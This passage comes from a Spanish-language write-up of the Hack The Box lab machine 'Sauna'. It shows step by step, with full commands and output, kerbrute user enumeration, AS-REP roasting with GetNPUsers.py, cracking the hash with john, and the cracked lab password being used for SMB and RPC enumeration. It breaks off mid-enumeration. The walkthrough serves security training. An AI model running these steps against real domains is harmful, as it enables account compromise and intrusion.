+|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN<span class="o">=</span>NTDS Quotas,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN<span class="o">=</span>Microsoft,CN<span class="o">=</span>Program Data,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN<span class="o">=</span>Program Data,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN<span class="o">=</span>ForeignSecurityPrincipals,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN<span class="o">=</span>Infrastructure,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN<span class="o">=</span>LostAndFound,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN<span class="o">=</span>System,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU<span class="o">=</span>Domain Controllers,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN<span class="o">=</span>Computers,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN<span class="o">=</span>Users,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         objectCategory: <span class="nv">CN</span><span class="o">=</span>Domain-DNS,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         isCriticalSystemObject: TRUE
+|         gPLink: <span class="o">[</span>LDAP://CN<span class="o">={</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>,CN<span class="o">=</span>Policies,CN<span class="o">=</span>System,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL<span class="p">;</span>0]
+|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
+|         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN<span class="o">=</span>Keys,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN<span class="o">=</span>Managed Service Accounts,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         masteredBy: <span class="nv">CN</span><span class="o">=</span>NTDS Settings,CN<span class="o">=</span>SAUNA,CN<span class="o">=</span>Servers,CN<span class="o">=</span>Default-First-Site-Name,CN<span class="o">=</span>Sites,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         ms-DS-MachineAccountQuota: 10
+|         msDS-Behavior-Version: 7
+|         msDS-PerUserTrustQuota: 1
+|         msDS-AllUsersTrustQuota: 1000
+|         msDS-PerUserTrustTombstonesQuota: 10
+|         msDs-masteredBy: <span class="nv">CN</span><span class="o">=</span>NTDS Settings,CN<span class="o">=</span>SAUNA,CN<span class="o">=</span>Servers,CN<span class="o">=</span>Default-First-Site-Name,CN<span class="o">=</span>Sites,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         msDS-IsDomainFor: <span class="nv">CN</span><span class="o">=</span>NTDS Settings,CN<span class="o">=</span>SAUNA,CN<span class="o">=</span>Servers,CN<span class="o">=</span>Default-First-Site-Name,CN<span class="o">=</span>Sites,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|         msDS-NcType: 0
+|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
+|         dc: EGOTISTICAL-BANK
+|     dn: <span class="nv">CN</span><span class="o">=</span>Users,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|     dn: <span class="nv">CN</span><span class="o">=</span>Computers,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|     dn: <span class="nv">OU</span><span class="o">=</span>Domain Controllers,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|     dn: <span class="nv">CN</span><span class="o">=</span>System,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|     dn: <span class="nv">CN</span><span class="o">=</span>LostAndFound,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|     dn: <span class="nv">CN</span><span class="o">=</span>Infrastructure,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|     dn: <span class="nv">CN</span><span class="o">=</span>ForeignSecurityPrincipals,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|     dn: <span class="nv">CN</span><span class="o">=</span>Program Data,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|     dn: <span class="nv">CN</span><span class="o">=</span>NTDS Quotas,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|     dn: <span class="nv">CN</span><span class="o">=</span>Managed Service Accounts,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|     dn: <span class="nv">CN</span><span class="o">=</span>Keys,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|     dn: <span class="nv">CN</span><span class="o">=</span>TPM Devices,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|     dn: <span class="nv">CN</span><span class="o">=</span>Builtin,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+|_    dn: <span class="nv">CN</span><span class="o">=</span>Hugo Smith,DC<span class="o">=</span>EGOTISTICAL-BANK,DC<span class="o">=</span>LOCAL
+445/tcp open  microsoft-ds?
+464/tcp open  kpasswd5?
+593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp open  tcpwrapped
+Service Info: Host: SAUNA<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Bueno tenemos un nuevo usuario que al parecer nosotros no en la web no sabemos si sea empleado o alguna otra cosa igual lo vamos agregar ala lista para ver si el usuario aplica para el ataque que vamos a hacer <code class="language-plaintext highlighter-rouge">Hugo Smith</code>.</p>
+  </li>
+  <li>
+    <p>Bueno casi siempre en los entornos de <strong>AD</strong> los usuarios suelen ser la primer letra de su nombre y después su apellido entonces basándonos en todos los nombres que tenemos asta ahora ya podemos hacer la lista.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn <span class="nb">users
+</span>hsmith
+fsmith
+scoins
+hbear
+skerb
+btaylor
+sdriver
+scoins
+</code></pre></div></div>
+
+<ul>
+  <li>Puedes descargarte la herramienta de <strong>kerbrute</strong> desde su repositorio <a href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./kerbrute <span class="nt">-h</span>
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 06/09/23 - Ronnie Flathers @ropnop
+
+This tool is designed to assist <span class="k">in </span>quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
+It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
+Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts
+
+Usage:
+  kerbrute <span class="o">[</span><span class="nb">command</span><span class="o">]</span>
+
+Available Commands:
+  bruteforce    Bruteforce username:password combos, from a file or stdin
+  bruteuser     Bruteforce a single user<span class="s1">'s password from a wordlist
+  help          Help about any command
+  passwordspray Test a single password against a list of users
+  userenum      Enumerate valid domain usernames via Kerberos
+  version       Display version info and quit
+
+Flags:
+      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
+      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
+  -d, --domain string   The full domain to use (e.g. contoso.com)
+  -h, --help            help for kerbrute
+  -o, --output string   File to write logs to. Optional.
+      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
+  -t, --threads int     Threads to use (default 10)
+  -v, --verbose         Log failures and errors
+
+Use "kerbrute [command] --help" for more information about a command.
+</span></code></pre></div></div>
+
+<ul>
+  <li>Vamos aplicar un <strong>userenum</strong> e indicando la lista ya vemos que estos 2 usuarios son validos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./kerbrute userenum <span class="nb">users</span> <span class="nt">--dc</span> EGOTISTICAL-BANK.LOCAL <span class="nt">-d</span> EGOTISTICAL-BANK.LOCAL
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 06/09/23 - Ronnie Flathers @ropnop
+
+2023/06/09 11:41:18 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+2023/06/09 11:41:18 <span class="o">&gt;</span>  	EGOTISTICAL-BANK.LOCAL:88
+
+2023/06/09 11:41:18 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	hsmith@EGOTISTICAL-BANK.LOCAL
+2023/06/09 11:41:18 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	fsmith@EGOTISTICAL-BANK.LOCAL
+2023/06/09 11:41:18 <span class="o">&gt;</span>  Done! Tested 8 usernames <span class="o">(</span>2 valid<span class="o">)</span> <span class="k">in </span>0.144 seconds
+</code></pre></div></div>
+
+<h1 id="getnpuserspy">GetNPUsers.py</h1>
+
+<ul>
+  <li>Ahora si podemos crackear el <strong>hash</strong> de solo un usuario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> <span class="nb">users
+</span>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span>-] User hsmith doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:bc88eca46b629cb4cfb7f20b683b013d$2a6606a096df08d50e5d26bc11a86de24121eee4ce4c74d949007df65faf3ab5915b8fc4643041dc44949d5772e017658fed479ba42c3192aabfd246bb0e85f7b4137072884a6772d227b0d7750d8474d7670f14f604c9a8db48524c020a57280893b36e54f59a667ee8251af5eca25345854f64c2a28d17c6fc13849772db39a5bfaa9474cfc6bd4e4a71f709f5b3c09bcbec7df271f4159ac87c9006e2eb3380c64242551331be27f0f5829391bf4932e3f026f5efb13df52adf189540f84b693beba5baa0e4436e73b00281d0f5b7f56c4fbcf7570cf1c50fa9107ac7760b3bf39dd29db67abd1be5734f4c76c5d85e2f468634ba63409026956ea88d9fd0
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+</span></code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn <span class="nb">hash</span>
+<span class="nv">$krb5asrep$23$fsmith</span>@EGOTISTICAL-BANK.LOCAL:bc88eca46b629cb4cfb7f20b683b013d<span class="nv">$2a6606a096df08d50e5d26bc11a86de24121eee4ce4c74d949007df65faf3ab5915b8fc4643041dc44949d5772e017658fed479ba42c3192aabfd246bb0e85f7b4137072884a6772d227b0d7750d8474d7670f14f604c9a8db48524c020a57280893b36e54f59a667ee8251af5eca25345854f64c2a28d17c6fc13849772db39a5bfaa9474cfc6bd4e4a71f709f5b3c09bcbec7df271f4159ac87c9006e2eb3380c64242551331be27f0f5829391bf4932e3f026f5efb13df52adf189540f84b693beba5baa0e4436e73b00281d0f5b7f56c4fbcf7570cf1c50fa9107ac7760b3bf39dd29db67abd1be5734f4c76c5d85e2f468634ba63409026956ea88d9fd0</span>
+
+</code></pre></div></div>
+
+<h1 id="crack-hash">Crack Hash</h1>
+
+<ul>
+  <li>Ahora lo crackeamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+Thestrokes23     <span class="o">(</span><span class="nv">$krb5asrep$23$fsmith</span>@EGOTISTICAL-BANK.LOCAL<span class="o">)</span>
+1g 0:00:00:20 DONE <span class="o">(</span>2023-06-09 12:10<span class="o">)</span> 0.04780g/s 503776p/s 503776c/s 503776C/s Thrall..Thehunter22
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<h1 id="fsmith">fsmith</h1>
+
+<ul>
+  <li>Ahora lo que sigue es validar que las credenciales sean correctas para eso vamos a usar la herramienta de <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span>
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SAUNA<span class="o">)</span> <span class="o">(</span>domain:EGOTISTICAL-BANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.175    445    SAUNA            <span class="o">[</span>+] EGOTISTICAL-BANK.LOCAL<span class="se">\f</span>smith:Thestrokes23 
+
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos permisos de lectura en algunas recursos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span>
+<span class="o">[</span>+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	print<span class="nv">$ </span>                                           	READ ONLY	Printer Drivers
+	RICOH Aficio SP 8300DN PCL 6                      	NO ACCESS	We cant print money
+	SYSVOL                                            	READ ONLY	Logon server share 
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span> <span class="nt">-r</span> SYSVOL
+<span class="o">[</span>+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	SYSVOL                                            	READ ONLY	
+	.<span class="se">\S</span>YSVOL<span class="se">\*</span>
+	dr--r--r--                0 Wed Jan 22 23:44:49 2020	<span class="nb">.</span>
+	dr--r--r--                0 Wed Jan 22 23:44:49 2020	..
+	dr--r--r--                0 Wed Jan 22 23:44:49 2020	EGOTISTICAL-BANK.LOCAL
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span> <span class="nt">-r</span> SYSVOL/EGOTISTICAL-BANK.LOCAL
+<span class="o">[</span>+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	SYSVOL                                            	READ ONLY	
+	.<span class="se">\S</span>YSVOLEGOTISTICAL-BANK.LOCAL<span class="se">\*</span>
+	dr--r--r--                0 Wed Jan 22 23:51:08 2020	<span class="nb">.</span>
+	dr--r--r--                0 Wed Jan 22 23:51:08 2020	..
+	dr--r--r--                0 Fri Jun  9 17:54:25 2023	DfsrPrivate
+	dr--r--r--                0 Sat Jan 25 14:48:44 2020	Policies
+	dr--r--r--                0 Wed Jan 22 23:44:49 2020	scripts
+
+</code></pre></div></div>
+
+<ul>
+  <li>No hay nada en <strong>scripts</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span> <span class="nt">-r</span> SYSVOL/EGOTISTICAL-BANK.LOCAL/scripts
+<span class="o">[</span>+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	SYSVOL                                            	READ ONLY	
+	.<span class="se">\S</span>YSVOLEGOTISTICAL-BANK.LOCAL<span class="se">\s</span>cripts<span class="se">\*</span>
+	dr--r--r--                0 Wed Jan 22 23:44:49 2020	<span class="nb">.</span>
+	dr--r--r--                0 Wed Jan 22 23:44:49 2020	..
+</code></pre></div></div>
+
+<ul>
+  <li>En este recurso como tal nos esta dando un error tal vez lo mas probable es que no tengamos permiso de lectura en ese recurso.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span> <span class="nt">-r</span> SYSVOL/EGOTISTICAL-BANK.LOCAL/DfsrPrivate
+<span class="o">[</span>+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
+<span class="o">[!]</span> Something weird happened: SMB SessionError: STATUS_ACCESS_DENIED<span class="o">({</span>Access Denied<span class="o">}</span> A process has requested access to an object but has not been granted those access rights.<span class="o">)</span> on line 881
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	SYSVOL                                            	READ ONLY	
+</code></pre></div></div>
+
+<ul>
+  <li>Bueno encontramos eso pero como tal no se si sea interesante pero bueno seguiremos enumerando.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span> <span class="nt">-r</span> SYSVOL/EGOTISTICAL-BANK.LOCAL/Policies
+<span class="o">[</span>+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	SYSVOL                                            	READ ONLY	
+	.<span class="se">\S</span>YSVOLEGOTISTICAL-BANK.LOCAL<span class="se">\P</span>olicies<span class="se">\*</span>
+	dr--r--r--                0 Sat Jan 25 14:48:44 2020	<span class="nb">.</span>
+	dr--r--r--                0 Sat Jan 25 14:48:44 2020	..
+	dr--r--r--                0 Sat Jan 25 14:48:44 2020	<span class="o">{</span>2619FB25-7519-4AEA-9C1E-348725EF2858<span class="o">}</span>
+	dr--r--r--                0 Wed Jan 22 23:44:49 2020	<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>
+	dr--r--r--                0 Wed Jan 22 23:44:49 2020	<span class="o">{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span class="o">}</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span> <span class="nt">-r</span> SYSVOL/EGOTISTICAL-BANK.LOCAL/Policies/<span class="o">{</span>2619FB25-7519-4AEA-9C1E-348725EF2858<span class="o">}</span>/User
+<span class="o">[</span>+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	SYSVOL                                            	READ ONLY	
+	.<span class="se">\S</span>YSVOLEGOTISTICAL-BANK.LOCAL<span class="se">\P</span>olicies<span class="se">\{</span>2619FB25-7519-4AEA-9C1E-348725EF2858<span class="o">}</span><span class="se">\U</span>ser<span class="se">\*</span>
+	dr--r--r--                0 Sat Jan 25 14:48:44 2020	<span class="nb">.</span>
+	dr--r--r--                0 Sat Jan 25 14:48:44 2020	..
+</code></pre></div></div>
+
+<ul>
+  <li>Esto se veía interesante pero nada.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span> <span class="nt">-r</span> SYSVOL/EGOTISTICAL-BANK.LOCAL/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Registry.pol
+<span class="o">[</span>+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
+<span class="o">[!]</span> Something weird happened: SMB SessionError: STATUS_NOT_A_DIRECTORY<span class="o">(</span>A requested opened file is not a directory.<span class="o">)</span> on line 881
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	SYSVOL                                            	READ ONLY	
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.175 <span class="nt">-u</span> <span class="s1">'fsmith'</span> <span class="nt">-p</span> <span class="s1">'Thestrokes23'</span> <span class="nt">-r</span> SYSVOL/EGOTISTICAL-BANK.LOCAL/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/GTP.INI
+<span class="o">[</span>+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
+<span class="o">[!]</span> Something weird happened: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND<span class="o">(</span>The object name is not found.<span class="o">)</span> on line 881
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	SYSVOL                                            	READ ONLY	
+
+</code></pre></div></div>
+
+<ul>
+  <li>Bueno si nos conectamos con <strong>rpcclient</strong> y enumeramos los usuarios vemos que nos reporta esto.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient 10.10.10.175 <span class="nt">-U</span> <span class="s1">'fsmith%Thestrokes23'</span> <span class="nt">-c</span> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[HSmith] rid:[0x44f]
+user:[FSmith] rid:[0x451]
+user:[svc_loanmgr] rid:[0x454]
+</code></pre></div></div>
+
+<ul>
+  <li>Aquí vemos los grupos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient 10.10.10.175 <span class="nt">-U</span> <span class="s1">'fsmith%Thestrokes23'</span>
+rpcclient <span class="nv">$&gt;</span> enumdomgroups
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Schema Admins] rid:[0x206]
+group:[Enterprise Admins] rid:[0x207]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[Key Admins] rid:[0x20e]
+group:[Enterprise Key Admins] rid:[0x20f]
+group:[DnsUpdateProxy] rid:[0x44e]
+rpcclient <span class="nv">$&gt;</span> 
+</code></pre></div></div>
+
+<ul>
+  <li>No vemos otro que este en <strong>Domain Admins</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nv">$&gt;</span> querygroupmem 0x200
+	rid:[0x1f4] attr:[0x7]
+rpcclient <span class="nv">$&gt;</span> queryuser 0x1f4
+	User Name   :	Administrator
+	Full Name   :	
+	Home Drive  :	
+	Dir Drive   :	
+	Profile Path:	
+	Logon Script:	
+	Description :	Built-in account <span class="k">for </span>administering the computer/domain
+	Workstations:	
+	Comment     :	
+	Remote Dial :
+	Logon Time               :	vie, 09 jun 2023 17:54:43 CST
+	Logoff Time              :	mié, 31 dic 1969 18:00:00 CST
+	Kickoff Time             :	mié, 31 dic 1969 18:00:00 CST
+	Password last <span class="nb">set </span>Time   :	lun, 26 jul 2021 11:16:16 CDT
+	Password can change Time :	mar, 27 jul 2021 11:16:16 CDT
+	Password must change Time:	mié, 13 sep 30828 20:48:05 CST
+	unknown_2[0..31]...
+	user_rid :	0x1f4
+	group_rid:	0x201
+	acb_info :	0x00000210
+	fields_present:	0x00ffffff
+	logon_divs:	168
+	bad_password_count:	0x00000000
+	logon_count:	0x0000005a
+	padding1[0..7]...
+	logon_hrs[0..21]...
+
+</code></pre></div></div>
+
+<ul>
+  <li>Nada interesante tampoco.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nv">$&gt;</span> querydispinfo
+index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for </span>administering the computer/domain
+index: 0xfaf RID: 0x451 acb: 0x00010210 Account: FSmith	Name: Fergus Smith	Desc: <span class="o">(</span>null<span class="o">)</span>
